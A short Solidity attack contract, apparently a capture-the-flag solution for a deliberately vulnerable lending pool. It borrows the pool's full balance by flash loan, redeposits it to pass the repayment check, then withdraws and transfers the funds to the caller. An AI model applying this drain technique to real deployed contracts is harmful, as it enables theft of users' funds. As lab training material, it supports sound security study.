// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public pool;
    uint256 amount;
    constructor( SideEntranceLenderPool _pool){
        pool = _pool;
    }

    function start() external payable{
        amount = address( pool).balance;
        pool.flashLoan( amount);
        pool.withdraw();
    }
    function execute() external payable{
        console.log( "Contract balance: ", address( this).balance/ 1 ether);
        pool.deposit{ value: amount}();
    }

    receive() external payable{
        console.log( "Contract balance: ", msg.value/ 1 ether);
        payable( tx.origin).transfer( amount);
    }

}